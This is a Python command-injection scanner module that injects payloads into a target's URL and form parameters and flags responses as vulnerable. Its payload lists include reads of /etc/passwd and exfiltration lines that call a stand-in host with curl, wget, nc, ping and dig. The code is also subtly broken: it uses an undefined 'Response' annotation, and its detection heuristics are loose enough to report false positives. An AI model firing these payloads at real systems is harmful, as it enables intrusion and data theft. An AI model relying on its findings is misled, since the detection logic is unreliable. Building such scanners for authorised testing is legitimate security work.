#!/usr/bin/env python3
import requests
from typing import Dict, List, Optional
from urllib.parse import urljoin, parse_qs, urlparse
import json
import re
from RAGScripts.utils.logger import setup_scanner_logger

async def check_command_injection(target_url: str, path: str, method: str, initial_response: requests.Response) -> List[Dict]:
    findings = []
    
    try:
        test_url = urljoin(target_url, path)
        
        # Test cases for command injection
        test_cases = [
            {
                'name': 'Basic Command Injection',
                'payloads': [
                    '; ls -la',
                    '| ls -la',
                    '`ls -la`',
                    '$(ls -la)',
                    '&& ls -la'
                ]
            },
            {
                'name': 'Blind Command Injection',
                'payloads': [
                    '; sleep 5',
                    '| sleep 5',
                    '`sleep 5`',
                    '$(sleep 5)',
                    '&& sleep 5'
                ]
            },
            {
                'name': 'Command Chaining',
                'payloads': [
                    '; cat /etc/passwd',
                    '| cat /etc/passwd',
                    '`cat /etc/passwd`',
                    '$(cat /etc/passwd)',
                    '&& cat /etc/passwd'
                ]
            },
            {
                'name': 'Data Exfiltration',
                'payloads': [
                    '; curl http://attacker.com/$(cat /etc/passwd)',
                    '| wget http://attacker.com/$(whoami)',
                    '`ping -c 1 attacker.com`',
                    '$(dig attacker.com)',
                    '&& nc attacker.com 80'
                ]
            }
        ]
        
        # Extract parameters from initial response
        params = extract_parameters(initial_response)
        
        for param_name, param_value in params.items():
            for test in test_cases:
                for payload in test['payloads']:
                    try:
                        # Test parameters
                        modified_params = params.copy()
                        modified_params[param_name] = payload
                        
                        response = requests.request(
                            method,
                            test_url,
                            params=modified_params if method == 'GET' else None,
                            data=modified_params if method != 'GET' else None,
                            headers={'Content-Type': 'application/x-www-form-urlencoded'},
                            timeout=10 if test['name'] == 'Blind Command Injection' else 5
                        )
                        
                        if is_command_vulnerable(response, test, payload):
                            findings.append({
                                "type": "Command Injection",
                                "detail": f"Potential {test['name']} vulnerability",
                                "evidence": {
                                    "url": test_url,
                                    "parameter": param_name,
                                    "payload": payload,
                                    "status_code": response.status_code,
                                    "response": response.text[:200]
                                }
                            })
                            
                    except requests.exceptions.RequestException:
                        continue
                    
    except Exception as e:
        print(f"Error in command injection check: {str(e)}")
    
    return findings

def extract_parameters(response: requests.Response) -> Dict:
    params = {}
    
    # Extract URL parameters
    if response.request.url:
        parsed_url = urlparse(response.request.url)
        params.update(parse_qs(parsed_url.query))
    
    # Extract form parameters
    try:
        content = response.text
        input_pattern = r'<input[^>]+name=["\']([^"\']+)["\'][^>]*>'
        for match in re.finditer(input_pattern, content):
            params[match.group(1)] = ''
    except:
        pass
    
    return params

def is_command_vulnerable(response: Response, test: Dict, payload: str) -> bool:
    try:
        response_text = response.text.lower()
        
        # Command execution indicators
        command_patterns = [
            'root:x:0:0',          # /etc/passwd content
            'total',               # ls command output
            'drwx',               # ls command output
            'bin',                # Common system directories
            'etc',                # Common system directories
            'usr',                # Common system directories
            'permission denied',   # Command execution attempt
            'command not found',   # Command execution attempt
            'syntax error'         # Shell errors
        ]
        
        # Check for command output in response
        if any(pattern in response_text for pattern in command_patterns):
            return True
        
        # Check for time-based injection
        if test['name'] == 'Blind Command Injection':
            if response.elapsed.total_seconds() >= 5:
                return True
        
        # Check for successful data exfiltration
        if test['name'] == 'Data Exfiltration':
            if response.status_code == 200 and len(response_text) > 0:
                return True
        
        # Check for command chaining success
        if test['name'] == 'Command Chaining':
            if any(pattern in response_text for pattern in ['root:', '/bin/', '/usr/']):
                return True
        
    except:
        pass
    
    return False

if __name__ == "__main__":
    # For standalone testing
    import asyncio
    async def test():
        result = await check_command_injection(
            "http://localhost:5000",
            "/api/execute",
            "POST",
            requests.Response()
        )
        print(json.dumps(result, indent=2))
    
    asyncio.run(test())